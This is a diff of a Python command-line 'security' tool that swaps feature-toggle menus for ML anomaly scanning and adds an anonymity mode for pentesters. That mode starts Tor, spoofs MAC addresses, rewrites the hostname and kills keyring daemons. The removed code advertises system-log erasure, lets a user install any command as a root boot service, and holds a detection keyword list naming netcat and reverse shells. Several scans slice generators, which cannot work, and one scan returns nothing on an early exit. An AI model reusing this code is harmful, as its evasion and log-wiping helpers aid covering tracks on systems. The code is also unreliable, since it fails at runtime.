+                    print(f"\n🚨🚨🚨 ML THREATS DETECTED! 🚨🚨🚨")
+                    print(f"🧠 {len(all_threats)} ML anomaly(ies) found:")
+                    
+                    for i, threat in enumerate(all_threats[:10], 1):
+                        print(f"   {i}. {threat}")
+                        
+                    if len(all_threats) > 10:
+                        print(f"   ... and {len(all_threats) - 10} more ML anomalies")
+                    
+                    # Play alert sound
+                    self._play_alert_sound()
+                    
+                    print(f"📊 Total ML alerts this session: {alert_count}")
+                    print("=" * 70)
+                else:
+                    print("✅ No ML anomalies detected - System secure")
+                    
+                time.sleep(15)  # Scan every 15 seconds
+                
+            except KeyboardInterrupt:
+                print(f"\n\n⚠️  ML monitoring stopped by user")
+                break
+            except Exception as e:
+                print(f"\n❌ ML monitoring error: {e}")
+                time.sleep(5)
+                
+        print(f"\n📊 Final ML alert count: {alert_count}")
+    
+    def run_ml_comprehensive_scan(self):
+        """Run comprehensive ML scan"""
+        print("🤖 COMPREHENSIVE ML SECURITY SCAN")
+        print("=" * 50)
         
-        for i, feature in enumerate(features, 1):
-            state = get_feature_state(feature)
-            status = "🟢 ON" if state == 'on' else "🔴 OFF"
-            print(f"│ {i}. {feature.upper():<12}: {status}{' ' * 32}│")
+        all_threats = []
         
-        print("└─────────────────────────────────────────────────────────────────┘")
-        print()
+        # ML File System Scan
+        print("📁 ML File System Scan...")
+        file_threats = []
+        for file_path in Path('/tmp').rglob('*')[:100]:
+            try:
+                threats = self.ml_detector.analyze_file_with_ml(file_path)
+                file_threats.extend(threats)
+            except:
+                continue
+                
+        print(f"   Found {len(file_threats)} file anomalies")
+        all_threats.extend(file_threats)
         
-        print("┌─────────────────────────────────────────────────────────────────┐")
-        print("│                 CONTROL OPTIONS                           │")
-        print("├─────────────────────────────────────────────────────────────────┤")
-        print("│ 1️⃣ 🔄 Toggle All       4️⃣ ⚡ Enable Multiple    │")
-        print("│ 2️⃣ 🔧 Individual Toggle  5️⃣ ⚡ Disable Multiple    │")
-        print("│ 3️⃣ 📊 Show Status       6️⃣ 🔙 Back to Main        │")
-        print("└─────────────────────────────────────────────────────────────────┘")
+        # ML Process Scan
+        print("🔧 ML Process Scan...")
+        process_threats = []
+        for process in psutil.process_iter(['pid'])[:100]:
+            try:
+                pid = process.info['pid']
+                threats = self.ml_detector.analyze_process_with_ml(pid)
+                process_threats.extend(threats)
+            except:
+                continue
+                
+        print(f"   Found {len(process_threats)} process anomalies")
+        all_threats.extend(process_threats)
+        
+        # ML Network Scan
+        print("🌐 ML Network Scan...")
+        network_threats = []
+        connections = psutil.net_connections()[:100]
+        for conn in connections:
+            try:
+                threats = self.ml_detector.analyze_network_with_ml(conn)
+                network_threats.extend(threats)
+            except:
+                continue
+                
+        print(f"   Found {len(network_threats)} network anomalies")
+        all_threats.extend(network_threats)
+        
+        # Results
+        print(f"\n📊 ML SCAN RESULTS:")
+        print(f"   Total ML anomalies: {len(all_threats)}")
+        print(f"   File anomalies: {len(file_threats)}")
+        print(f"   Process anomalies: {len(process_threats)}")
+        print(f"   Network anomalies: {len(network_threats)}")
+        
+        if all_threats:
+            print(f"\n⚠️  ML ANOMALIES DETECTED:")
+            for i, threat in enumerate(all_threats[:20], 1):
+                print(f"   {i}. {threat}")
+        else:
+            print("\n✅ No ML anomalies detected - System secure")
+    
+    def run_anonymity_mode(self):
+        """Activate anonymity mode for pentesters"""
+        print("👤 ANONYMITY MODE ACTIVATED")
+        print("=" * 50)
+        
+        try:
+            # Start Tor service
+            print("🔧 Starting Tor service...")
+            result = subprocess.run(['sudo', 'systemctl', 'start', 'tor'], capture_output=True, text=True)
+            if result.returncode == 0:
+                print("✅ Tor service started")
+            else:
+                print("⚠️  Tor service failed to start")
+            
+            # Randomize MAC address
+            print("🔧 Randomizing MAC address...")
+            interfaces = psutil.net_if_addrs()
+            for interface in interfaces:
+                if interface != 'lo' and interface.startswith(('eth', 'wlan', 'enp')):
+                    try:
+                        # Generate random MAC
+                        import random
+                        mac = "02:%02x:%02x:%02x:%02x:%02x" % (
+                            random.randint(0, 255),
+                            random.randint(0, 255),
+                            random.randint(0, 255),
+                            random.randint(0, 255),
+                            random.randint(0, 255)
+                        )
+                        
+                        # Change MAC address
+                        subprocess.run(['sudo', 'ifconfig', interface, 'down'], check=True)
+                        subprocess.run(['sudo', 'ifconfig', interface, 'hw', 'ether', mac], check=True)
+                        subprocess.run(['sudo', 'ifconfig', interface, 'up'], check=True)
+                        print(f"✅ MAC address randomized for {interface}: {mac}")
+                    except:
+                        print(f"❌ Failed to randomize MAC for {interface}")
+            
+            # Change hostname
+            print("🔧 Changing hostname...")
+            import random
+            import string
+            hostname = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+            
+            try:
+                subprocess.run(['sudo', 'hostname', hostname], check=True)
+                with open('/etc/hostname', 'w') as f:
+                    f.write(hostname + '\n')
+                print(f"✅ Hostname changed to: {hostname}")
+            except:
+                print("❌ Failed to change hostname")
+            
+            # Clear DNS cache
+            print("🔧 Clearing DNS cache...")
+            try:
+                subprocess.run(['sudo', 'systemd-resolve', '--flush-caches'], check=True)
+                print("✅ DNS cache cleared")
+            except:
+                print("❌ Failed to clear DNS cache")
+            
+            # Kill identifying processes
+            print("🔧 Terminating identifying processes...")
+            dangerous_processes = ['gnome-keyring-daemon', 'kwalletd5', 'secret-service']
+            for proc in psutil.process_iter(['name']):
+                try:
+                    if proc.info['name'] in dangerous_processes:
+                        proc.kill()
+                        print(f"✅ Terminated: {proc.info['name']}")
+                except:
+                    continue
+            
+            # Set proxy environment variables
+            print("🔧 Setting up proxy environment...")
+            proxy_vars = {
+                'HTTP_PROXY': 'http://127.0.0.1:9050',
+                'HTTPS_PROXY': 'http://127.0.0.1:9050',
+                'FTP_PROXY': 'http://127.0.0.1:9050',
+                'SOCKS_PROXY': 'socks5://127.0.0.1:9050'
+            }
+            
+            for var, value in proxy_vars.items():
+                os.environ[var] = value
+                print(f"✅ Set {var}={value}")
+            
+            print("\n🎭 ANONYMITY MODE ACTIVE")
+            print("🔐 Your identity is now protected")
+            print("🌐 All traffic routed through Tor")
+            print("🔧 MAC address randomized")
+            print("🏷️  Hostname changed")
+            print("🗑️  DNS cache cleared")
+            print("🔑 Keyring processes terminated")
+            print("⚠️  Remember: Stay anonymous and stay safe!")
+            
+        except Exception as e:
+            print(f"❌ Anonymity mode error: {e}")
+    
+    def check_anonymity_status(self):
+        """Check current anonymity status"""
+        print("🔍 ANONYMITY STATUS CHECK")
+        print("=" * 50)
+        
+        # Check Tor status
+        try:
+            result = subprocess.run(['sudo', 'systemctl', 'is-active', 'tor'], capture_output=True, text=True)
+            if 'active' in result.stdout:
+                print("✅ Tor service is active")
+            else:
+                print("❌ Tor service is not active")
+        except:
+            print("❌ Cannot check Tor status")
+        
+        # Check MAC addresses
+        print("\n🔧 Current MAC addresses:")
+        interfaces = psutil.net_if_addrs()
+        for interface in interfaces:
+            if interface != 'lo' and interface.startswith(('eth', 'wlan', 'enp')):
+                try:
+                    result = subprocess.run(['ifconfig', interface], capture_output=True, text=True)
+                    for line in result.stdout.split('\n'):
+                        if 'ether' in line:
+                            mac = line.split('ether')[1].strip().split()[0]
+                            print(f"   {interface}: {mac}")
+                            break
+                except:
+                    print(f"   {interface}: Unknown")
+        
+        # Check hostname
+        try:
+            hostname = socket.gethostname()
+            print(f"\n🏷️  Current hostname: {hostname}")
+        except:
+            print("\n🏷️  Hostname: Unknown")
+        
+        # Check proxy environment
+        print("\n🌐 Proxy environment:")
+        proxy_vars = ['HTTP_PROXY', 'HTTPS_PROXY', 'FTP_PROXY', 'SOCKS_PROXY']
+        for var in proxy_vars:
+            value = os.environ.get(var, 'Not set')
+            print(f"   {var}: {value}")
+        
+        # Check for identifying processes
+        print("\n🔑 Identifying processes:")
+        dangerous_processes = ['gnome-keyring-daemon', 'kwalletd5', 'secret-service']
+        found_processes = []
+        
+        for proc in psutil.process_iter(['name']):
+            try:
+                if proc.info['name'] in dangerous_processes:
+                    found_processes.append(proc.info['name'])
+            except:
+                continue
+        
+        if found_processes:
+            print(f"   ⚠️  Found: {', '.join(found_processes)}")
+        else:
+            print("   ✅ No dangerous processes found")
+        
+        print("\n🎭 ANONYMITY STATUS COMPLETE")
+    
+    def restore_identity(self):
+        """Restore original system identity"""
+        print("🔄 RESTORING IDENTITY")
+        print("=" * 50)
+        
+        try:
+            # Stop Tor service
+            print("🔧 Stopping Tor service...")
+            subprocess.run(['sudo', 'systemctl', 'stop', 'tor'], check=True)
+            print("✅ Tor service stopped")
+            
+            # Restore original MAC addresses
+            print("🔧 Restoring MAC addresses...")
+            # In a real implementation, you'd store original MACs first
+            print("⚠️  Original MAC restoration requires saved configuration")
+            
+            # Restore original hostname
+            print("🔧 Restoring hostname...")
+            original_hostname = "kali"  # Default Kali hostname
+            subprocess.run(['sudo', 'hostname', original_hostname], check=True)
+            with open('/etc/hostname', 'w') as f:
+                f.write(original_hostname + '\n')
+            print(f"✅ Hostname restored to: {original_hostname}")
+            
+            # Clear proxy environment
+            print("🔧 Clearing proxy environment...")
+            proxy_vars = ['HTTP_PROXY', 'HTTPS_PROXY', 'FTP_PROXY', 'SOCKS_PROXY']
+            for var in proxy_vars:
+                if var in os.environ:
+                    del os.environ[var]
+                    print(f"✅ Cleared {var}")
+            
+            print("\n🔓 IDENTITY RESTORED")
+            print("⚠️  Your original system identity is back")
+            print("🌐 Traffic no longer routed through Tor")
+            
+        except Exception as e:
+            print(f"❌ Identity restoration error: {e}")
+    
+    def interactive_mode(self):
+        """Interactive AI/ML security control panel"""
+        while True:
+            self.show_banner()
+            
+            print("🤖 AI/ML SECURITY OPTIONS:")
+            print("┌─────────────────────────────────────────────────────────────────┐")
+            print("│ 1️⃣  🤖 ML Real-time Monitor  6️⃣  👤 Anonymity Mode        │")
+            print("│ 2️⃣  🧠 ML Comprehensive Scan 7️⃣  🔧 Retrain Models       │")
+            print("│ 3️⃣  📁 ML File Analysis      8️⃣  ⚙️ ML Configuration      │")
+            print("│ 4️⃣  🔧 ML Process Analysis   9️⃣  📊 Model Statistics     │")
+            print("│ 5️⃣  🌐 ML Network Analysis  🔟  🔙 Exit                  │")
+            print("└─────────────────────────────────────────────────────────────────┘")
+            print()
+            print("💡 QUICK COMMAND REFERENCE:")
+            print("   python3 abyssal.py --ml-monitor    # Real-time ML monitoring")
+            print("   python3 abyssal.py --ml-scan       # ML comprehensive scan")
+            print("   python3 abyssal.py --anon          # Activate anonymity mode")
+            print("   python3 abyssal.py --retrain       # Retrain ML models")
+            print()
+            
+            try:
+                choice = input("⚡ Select option (1-10): ").strip()
+                
+                if choice == '1':
+                    self.ml_real_time_monitor()
+                elif choice == '2':
+                    self.run_ml_comprehensive_scan()
+                elif choice == '3':
+                    self.run_ml_file_analysis()
+                elif choice == '4':
+                    self.run_ml_process_analysis()
+                elif choice == '5':
+                    self.run_ml_network_analysis()
+                elif choice == '6':
+                    self.run_anonymity_mode()
+                elif choice == '7':
+                    self.retrain_ml_models()
+                elif choice == '8':
+                    self.configure_ml_settings()
+                elif choice == '9':
+                    self.show_model_statistics()
+                elif choice == '10':
+                    print("👋 Goodbye!")
+                    break
+                else:
+                    print("❌ Invalid option!")
+                    
+                input("\n⏸️  Press Enter to continue...")
+                
+            except KeyboardInterrupt:
+                print("\n👋 Goodbye!")
+                break
+            except Exception as e:
+                print(f"\n❌ Error: {e}")
+                input("\n⏸️  Press Enter to continue...")
+    
+    def run_ml_file_analysis(self):
+        """Run ML file analysis"""
+        print("📁 ML FILE ANALYSIS")
+        print("=" * 50)
+        
+        file_path = input("Enter file path to analyze: ").strip()
+        
+        if not file_path or not Path(file_path).exists():
+            print("❌ Invalid file path")
+            return
+            
+        print(f"\n🧠 Analyzing {file_path} with ML models...")
+        
+        threats = self.ml_detector.analyze_file_with_ml(Path(file_path))
+        
+        if threats:
+            print(f"\n⚠️  ML ANOMALIES DETECTED:")
+            for threat in threats:
+                print(f"   {threat}")
+        else:
+            print("\n✅ No ML anomalies detected - File appears normal")
+    
+    def run_ml_process_analysis(self):
+        """Run ML process analysis"""
+        print("🔧 ML PROCESS ANALYSIS")
+        print("=" * 50)
+        
+        pid_input = input("Enter PID to analyze (or 'all' for all processes): ").strip()
+        
+        if pid_input == 'all':
+            print("\n🧠 Analyzing all processes with ML models...")
+            all_threats = []
+            
+            for process in psutil.process_iter(['pid'])[:50]:
+                try:
+                    pid = process.info['pid']
+                    threats = self.ml_detector.analyze_process_with_ml(pid)
+                    all_threats.extend(threats)
+                except:
+                    continue
+                    
+            if all_threats:
+                print(f"\n⚠️  ML PROCESS ANOMALIES DETECTED:")
+                for threat in all_threats:
+                    print(f"   {threat}")
+            else:
+                print("\n✅ No ML process anomalies detected")
+                
+        elif pid_input.isdigit():
+            pid = int(pid_input)
+            print(f"\n🧠 Analyzing process {pid} with ML models...")
+            
+            threats = self.ml_detector.analyze_process_with_ml(pid)
+            
+            if threats:
+                print(f"\n⚠️  ML PROCESS ANOMALIES DETECTED:")
+                for threat in threats:
+                    print(f"   {threat}")
+            else:
+                print("\n✅ No ML anomalies detected - Process appears normal")
+        else:
+            print("❌ Invalid input")
+    
+    def run_ml_network_analysis(self):
+        """Run ML network analysis"""
+        print("🌐 ML NETWORK ANALYSIS")
+        print("=" * 50)
+        
+        print("\n🧠 Analyzing network connections with ML models...")
+        
+        all_threats = []
+        connections = psutil.net_connections()[:100]
+        
+        for conn in connections:
+            try:
+                threats = self.ml_detector.analyze_network_with_ml(conn)
+                all_threats.extend(threats)
+            except:
+                continue
+                
+        if all_threats:
+            print(f"\n⚠️  ML NETWORK ANOMALIES DETECTED:")
+            for threat in all_threats:
+                print(f"   {threat}")
+        else:
+            print("\n✅ No ML network anomalies detected")
+    
+    def retrain_ml_models(self):
+        """Retrain ML models"""
+        print("🧠 RETRAINING ML MODELS")
+        print("=" * 50)
+        
+        print("🔄 Retraining ML models with current system data...")
+        
+        try:
+            self.ml_detector.train_initial_models()
+            self.ml_detector.save_models()
+            print("✅ ML models retrained successfully")
+        except Exception as e:
+            print(f"❌ Error retraining models: {e}")
+    
+    def configure_ml_settings(self):
+        """Configure ML settings"""
+        print("⚙️ ML CONFIGURATION")
+        print("=" * 50)
+        
+        print(f"📊 Current ML settings:")
+        for key, value in self.config.items():
+            print(f"   {key}: {value}")
+        
+        print("\n🔧 ML Settings:")
+        print("1. Toggle ML detection")
+        print("2. Change scan interval")
+        print("3. Toggle auto-exploit")
+        print("4. Reset ML models")
+        print("5. Back to main menu")
         
         try:
             choice = input("⚡ Select option: ").strip()
             
             if choice == '1':
-                toggle_all_features()
+                self.config['ml_detection'] = not self.config['ml_detection']
+                print(f"✅ ML detection: {self.config['ml_detection']}")
             elif choice == '2':
-                toggle_individual_feature()
+                interval = input("Enter scan interval (seconds): ").strip()
+                if interval.isdigit():
+                    self.config['scan_interval'] = int(interval)
+                    print(f"✅ Scan interval: {self.config['scan_interval']}s")
             elif choice == '3':
-                show_detailed_status()
+                self.config['auto_exploit'] = not self.config['auto_exploit']
+                print(f"✅ Auto-exploit: {self.config['auto_exploit']}")
             elif choice == '4':
-                enable_multiple_features()
+                self.reset_ml_models()
             elif choice == '5':
-                disable_multiple_features()
-            elif choice == '6':
                 return
             else:
-                print("\n❌ Invalid option!")
+                print("❌ Invalid option!")
                 
-            input("\n⏸️  Press Enter to continue...")
-                
-        except KeyboardInterrupt:
-            return
+            self.save_config()
+            
         except Exception as e:
-            print(f"\n❌ Error: {e}")
-            input("\n⏸️  Press Enter to continue...")
-
-def toggle_all_features():
-    """Toggle all features on/off"""
-    features = ['scan', 'fix', 'anon', 'harden', 'antimitm', 'logkiller', 'live', 'full']
-    all_on = all(get_feature_state(f) == 'on' for f in features)
-    new_state = 'off' if all_on else 'on'
+            print(f"❌ Configuration error: {e}")
     
-    for feature in features:
-        set_feature_state(feature, new_state)
-    
-    status = "🔴 DISABLED" if new_state == 'off' else "🟢 ENABLED"
-    print(f"\n✅ All features {status}")
-
-def toggle_individual_feature():
-    """Toggle individual feature"""
-    features = ['scan', 'fix', 'anon', 'harden', 'antimitm', 'logkiller', 'live', 'full']
-    
-    print("\n🔧 SELECT FEATURE TO TOGGLE:")
-    for i, feature in enumerate(features, 1):
-        state = get_feature_state(feature)
-        status = "🟢 ON" if state == 'on' else "🔴 OFF"
-        print(f"  {i}. {feature.upper():<12}: {status}")
-    
-    try:
-        choice = input(f"\n⚡ Select feature (1-{len(features)}): ").strip()
+    def reset_ml_models(self):
+        """Reset ML models"""
+        print("🔄 RESETTING ML MODELS")
+        print("=" * 50)
         
-        if choice.isdigit() and 1 <= int(choice) <= len(features):
-            feature = features[int(choice) - 1]
-            current_state = get_feature_state(feature)
-            new_state = 'off' if current_state == 'on' else 'on'
-            
-            if set_feature_state(feature, new_state):
-                status = "🔴 DISABLED" if new_state == 'off' else "🟢 ENABLED"
-                print(f"✅ {feature.upper()} {status}")
-            else:
-                print(f"❌ Failed to update {feature}")
-        else:
-            print("❌ Invalid selection!")
-            
-    except Exception as e:
-        print(f"❌ Error: {e}")
-
-def show_detailed_status():
-    """Show detailed feature status"""
-    features = ['scan', 'fix', 'anon', 'harden', 'antimitm', 'logkiller', 'live', 'full']
-    
-    print("\n📊 DETAILED FEATURE STATUS:")
-    print("┌─────────────────────────────────────────────────────────────────┐")
-    
-    for feature in features:
-        state = get_feature_state(feature)
-        status = "🟢 ENABLED" if state == 'on' else "🔴 DISABLED"
-        print(f"│ {feature.upper():<15}: {status}{' ' * 29}│")
-    
-    on_count = sum(1 for f in features if get_feature_state(f) == 'on')
-    print("├─────────────────────────────────────────────────────────────────┤")
-    print(f"│ SUMMARY: {on_count}/{len(features)} features enabled{' ' * 26}│")
-    print("└─────────────────────────────────────────────────────────────────┘")
-
-def enable_multiple_features():
-    """Enable multiple features"""
-    features = ['scan', 'fix', 'anon', 'harden', 'antimitm', 'logkiller', 'live', 'full']
-    
-    print("\n⚡ ENABLE MULTIPLE FEATURES:")
-    for i, feature in enumerate(features, 1):
-        print(f"  {i}. {feature}")
-    
-    try:
-        choices = input(f"\n⚡ Enter numbers to enable (comma-separated): ").strip()
-        
-        if choices:
-            selected = [int(x.strip()) for x in choices.split(',') if x.strip().isdigit()]
-            enabled = 0
-            
-            for choice in selected:
-                if 1 <= choice <= len(features):
-                    feature = features[choice - 1]
-                    if set_feature_state(feature, 'on'):
-                        enabled += 1
-            print(f"✅ Enabled {enabled} features")
-        else:
-            print("❌ No features selected")
-            
-    except Exception as e:
-        print(f"❌ Error: {e}")
-
-def disable_multiple_features():
-    """Disable multiple features"""
-    features = ['scan', 'fix', 'anon', 'harden', 'antimitm', 'logkiller', 'live', 'full']
-    
-    print("\n⚡ DISABLE MULTIPLE FEATURES:")
-    for i, feature in enumerate(features, 1):
-        print(f"  {i}. {feature}")
-    
-    try:
-        choices = input(f"\n⚡ Enter numbers to disable (comma-separated): ").strip()
-        
-        if choices:
-            selected = [int(x.strip()) for x in choices.split(',') if x.strip().isdigit()]
-            disabled = 0
-            
-            for choice in selected:
-                if 1 <= choice <= len(features):
-                    feature = features[choice - 1]
-                    if set_feature_state(feature, 'off'):
-                        disabled += 1
-            print(f"✅ Disabled {disabled} features")
-        else:
-            print("❌ No features selected")
-            
-    except Exception as e:
-        print(f"❌ Error: {e}")
-
-def startup_menu():
-    """Startup settings menu"""
-    clear_screen()
-    print("╔══════════════════════════════════════════════════════════════╗")
-    print("║                   STARTUP SETTINGS                         ║")
-    print("╚══════════════════════════════════════════════════════════════╝")
-    print()
-    
-    startup_file = f"{CONFIG_DIR}/startup-config"
-    current_config = "Unknown"
-    
-    try:
-        if os.path.exists(startup_file):
-            with open(startup_file, 'r') as f:
-                current_config = f.read().strip()
-    except:
-        pass
-    
-    print(f"📊 Current Startup: {current_config}")
-    print()
-    
-    print("┌─────────────────────────────────────────────────────────────────┐")
-    print("│                 STARTUP OPTIONS                          │")
-    print("├─────────────────────────────────────────────────────────────────┤")
-    print("│ 1️⃣ 🟢 Enable Live on Boot    4️⃣ 🔙 Back to Main       │")
-    print("│ 2️⃣ 🔴 Disable Live on Boot  5️⃣ ⚙️ Custom Command      │")
-    print("│ 3️⃣ 📊 Show Status                                          │")
-    print("└─────────────────────────────────────────────────────────────────┘")
-    
-    try:
-        choice = input("⚡ Select option: ").strip()
-        
-        if choice == '1':
-            enable_live_startup()
-        elif choice == '2':
-            disable_live_startup()
-        elif choice == '3':
-            show_startup_status()
-        elif choice == '4':
-            return  # Use return instead of return
-        elif choice == '5':
-            set_custom_startup()
-        else:
-            print("\n❌ Invalid option!")
-            
-        input("\n⏸️  Press Enter to continue...")
-        
-    except KeyboardInterrupt:
-        return
-    except Exception as e:
-        print(f"❌ Error: {e}")
-        input("\n⏸️  Press Enter to continue...")
-
-def enable_live_startup():
-    """Enable live monitoring on boot"""
-    try:
-        service_content = f"""[Unit]
-Description=ABYSSAL Live Monitoring
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/usr/bin/python3 {os.path.abspath(__file__)} --live
-Restart=always
-User=root
-Group=root
-
-[Install]
-WantedBy=multi-user.target
-"""
-        
-        service_file = "/etc/systemd/system/abyssal-live.service"
-        with open(service_file, 'w') as f:
-            f.write(service_content)
-        
-        subprocess.run(['sudo', 'systemctl', 'daemon-reload'], check=True)
-        subprocess.run(['sudo', 'systemctl', 'enable', 'abyssal-live.service'], check=True)
-        
-        with open(f"{CONFIG_DIR}/startup-config", 'w') as f:
-            f.write("live-monitoring-enabled")
-        
-        print("✅ Live monitoring enabled on boot")
-        
-    except Exception as e:
-        print(f"❌ Failed to enable startup: {e}")
-
-def disable_live_startup():
-    """Disable live monitoring on boot"""
-    try:
-        subprocess.run(['sudo', 'systemctl', 'disable', 'abyssal-live.service'], check=True)
-        subprocess.run(['sudo', 'systemctl', 'stop', 'abyssal-live.service'], check=True)
-        
-        with open(f"{CONFIG_DIR}/startup-config", 'w') as f:
-            f.write("live-monitoring-disabled")
-        
-        print("🔴 Live monitoring disabled on boot")
-        
-    except Exception as e:
-        print(f"❌ Failed to disable startup: {e}")
-
-def show_startup_status():
-    """Show current startup status"""
-    try:
-        result = subprocess.run(['sudo', 'systemctl', 'is-enabled', 'abyssal-live.service'], 
-                              capture_output=True, text=True)
-        
-        if 'enabled' in result.stdout:
-            print("🟢 Live monitoring is ENABLED on boot")
-        elif 'disabled' in result.stdout:
-            print("🔴 Live monitoring is DISABLED on boot")
-        else:
-            print("❓ Live monitoring status unknown")
-            
-    except Exception as e:
-        print(f"❌ Failed to check status: {e}")
-
-def set_custom_startup():
-    """Set custom startup command"""
-    try:
-        cmd = input("Enter custom startup command: ").strip()
-        
-        if cmd:
-            service_content = f"""[Unit]
-Description=ABYSSAL Custom Startup
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/bin/bash -c "{cmd}"
-Restart=always
-User=root
-Group=root
-
-[Install]
-WantedBy=multi-user.target
-"""
-            
-            service_file = "/etc/systemd/system/abyssal-custom.service"
-            with open(service_file, 'w') as f:
-                f.write(service_content)
-            
-            subprocess.run(['sudo', 'systemctl', 'daemon-reload'], check=True)
-            subprocess.run(['sudo', 'systemctl', 'enable', 'abyssal-custom.service'], check=True)
-            
-            with open(f"{CONFIG_DIR}/startup-config", 'w') as f:
-                f.write(f"custom: {cmd}")
-            
-            print(f"✅ Custom startup command set: {cmd}")
-        else:
-            print("❌ No command provided")
-            
-    except Exception as e:
-        print(f"❌ Failed to set custom startup: {e}")
-
-def start_live_monitoring():
-    """Start live monitoring with alerts"""
-    clear_screen()
-    print("╔══════════════════════════════════════════════════════════════╗")
-    print("║                   LIVE MONITORING                        ║")
-    print("╚══════════════════════════════════════════════════════════════╝")
-    print()
-    print("🔊 ALARM SYSTEM ACTIVE - Real-time threat detection")
-    print("🔄 Scanning every 30 seconds - Press Ctrl+C to stop")
-    print()
-    
-    alert_count = 0
-    
-    try:
-        while True:
-            timestamp = time.strftime('%H:%M:%S')
-            print(f"🕐 {timestamp} - Scanning system...")
-            
-            # Quick threat detection
-            threats = quick_threat_scan()
-            
-            if threats:
-                alert_count += 1
-                print(f"\n🚨🚨🚨 THREAT DETECTED! 🚨🚨🚨")
-                print(f"🔊 ALARM ACTIVATED! 🔊")
-                print(f"⚠️  {len(threats)} threat(s) found:")
-                
-                # Play alarm
-                play_alarm()
-                
-                # Show threats
-                for threat in threats[:3]:
-                    print(f"   {threat}")
-                
-                if len(threats) > 3:
-                    print(f"   ... and {len(threats) - 3} more threats")
-                
-                print(f"📊 Total alerts: {alert_count}")
-                print("━" * 60)
-            else:
-                print("✅ System secure - No threats detected")
-            
-            time.sleep(30)
-            
-    except KeyboardInterrupt:
-        print(f"\n\n⚠️  Live monitoring stopped")
-        print(f"📊 Total threat alerts: {alert_count}")
-    except Exception as e:
-        print(f"\n❌ Monitoring error: {e}")
-
-def quick_threat_scan():
-    """Quick threat detection scan"""
-    threats_found = []
-    
-    # Scan common locations
-    locations = ['/tmp', '/var/tmp', os.path.expanduser('~/.cache'), os.path.expanduser('~/.local/share')]
-    
-    for location in locations:
         try:
-            for root, dirs, files in os.walk(location):
-                for file in files:
-                    path = os.path.join(root, file)
-                    
-                    # Check for suspicious files
-                    if any(keyword in file.lower() for keyword in ['malware', 'virus', 'backdoor', 'rootkit']):
-                        threats_found.append(f"[THREAT] Suspicious file: {path}")
-                    
-                    # Check for hidden executables
-                    if file.startswith('.') and os.access(path, os.X_OK):
-                        threats_found.append(f"[THREAT] Hidden executable: {path}")
-                    
-                    if len(threats_found) > 10:
-                        return
-                if len(threats_found) > 10:
-                    return
-        except:
-            continue
+            # Delete model files
+            for model_file in MODEL_DIR.glob("*.pkl"):
+                model_file.unlink()
+                
+            # Reinitialize detector
+            self.ml_detector = MLThreatDetector()
+            
+            print("✅ ML models reset successfully")
+        except Exception as e:
+            print(f"❌ Error resetting models: {e}")
     
-    # Check processes
-    try:
-        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
-        for line in result.stdout.split('\n'):
-            if any(keyword in line.lower() for keyword in ['nc -l', 'netcat', 'reverse', 'backdoor']):
-                parts = line.split()
-                if len(parts) > 10:
-                    pid = parts[1]
-                    cmd = ' '.join(parts[10:])
-                    threats_found.append(f"[THREAT] Suspicious process PID {pid}: {cmd}")
-    except:
-        pass
-    
-    return threats_found
-
-def play_alarm():
-    """Play alarm sound"""
-    try:
-        # Try different alarm methods
-        methods = [
-            lambda: subprocess.run(['echo', '\a'], check=True),
-            lambda: subprocess.run(['paplay', '/usr/share/sounds/alsa/Front_Left.wav'], check=True, capture_output=True),
-            lambda: subprocess.run(['beep', '-f', '1000', '-l', '500'], check=True, capture_output=True)
-        ]
+    def show_model_statistics(self):
+        """Show ML model statistics"""
+        print("📊 ML MODEL STATISTICS")
+        print("=" * 50)
         
-        for method in methods:
-            try:
-                method()
-                return
-            except:
-                continue
-    except:
-        print('\a', end='', flush=True)
-
-def interactive_mode():
-    """Main interactive mode"""
-    main_menu()
-
-def print_logo_and_usage():
-    print("\n" + "="*50)
-    print("     ABYSSAL SECURITY")
-    print("="*50 + "\n")
-    print("Usage:")
-    print("  python3 abyssal.py --scan         # Run custom antivirus scan")
-    print("  python3 abyssal.py --fix          # Fix all detected threats automatically")
-    print("  python3 abyssal.py --interactive   # Interactive UI mode")
-    print("  python3 abyssal.py --live         # Start live monitoring")
-    print("  python3 abyssal.py --live-on      # Enable live monitoring on system boot")
-    print("  python3 abyssal.py --live-off     # Disable live monitoring on system boot")
-    print("  python3 abyssal.py --startup       # Configure startup settings")
-    print("  python3 abyssal.py --control      # Control all features on/off")
-    print("  python3 abyssal.py --harden       # System hardening")
-    print("  python3 abyssal.py --full         # Run all modules")
-    print("  python3 abyssal.py --logkiller    # Erase system logs")
-    print("  python3 abyssal.py --antimitm     # Run anti-MITM checks")
-    print("  python3 abyssal.py --anon         # Start anonymity mode\n")
-    print("Run with sudo if required for system-level actions.\n")
-
-def full_mode():
-    log_info("Running full mode: anonymity, scan, hardening.")
-    anon_mode()
-    scan_mode()
-    harden_mode()
+        print(f"🤖 ML Models loaded: {len(self.ml_detector.models)}")
+        print(f"📏 Feature scalers: {len(self.ml_detector.scalers)}")
+        print(f"✅ Baseline established: {self.ml_detector.baseline_established}")
+        print(f"📈 Threat history size: {len(self.ml_detector.threat_history)}")
+        
+        print(f"\n🧠 Available Models:")
+        for model_name in self.ml_detector.models.keys():
+            print(f"   {model_name}")
+    
+    def _play_alert_sound(self):
+        """Play alert sound on threat detection"""
+        try:
+            # Try multiple alert methods
+            alert_methods = [
+                lambda: os.system('echo -e "\\a"'),
+                lambda: os.system('paplay /usr/share/sounds/alsa/Front_Left.wav 2>/dev/null'),
+                lambda: os.system('beep -f 1000 -l 500 2>/dev/null'),
+                lambda: os.system('speaker-test -t sine -f 1000 -l 1 2>/dev/null')
+            ]
+            
+            for method in alert_methods:
+                try:
+                    method()
+                    break
+                except:
+                    continue
+                    
+        except Exception:
+            print('\a', end='', flush=True)
 
 def main():
-    print_logo_and_usage()
-    parser = argparse.ArgumentParser(description="Abyssal CLI: Born from the abyss, hunting malware in the shadows.")
-    parser.add_argument('--anon', action='store_true', help='Start anonymity mode')
-    parser.add_argument('--scan', action='store_true', help='Run custom antivirus scan')
-    parser.add_argument('--fix', action='store_true', help='Fix all detected threats automatically')
-    parser.add_argument('--interactive', action='store_true', help='Interactive UI mode')
-    parser.add_argument('--live', action='store_true', help='Start live monitoring')
-    parser.add_argument('--live-on', action='store_true', help='Enable live monitoring on system boot')
-    parser.add_argument('--live-off', action='store_true', help='Disable live monitoring on system boot')
-    parser.add_argument('--startup', action='store_true', help='Configure startup settings')
-    parser.add_argument('--control', action='store_true', help='Control all features on/off')
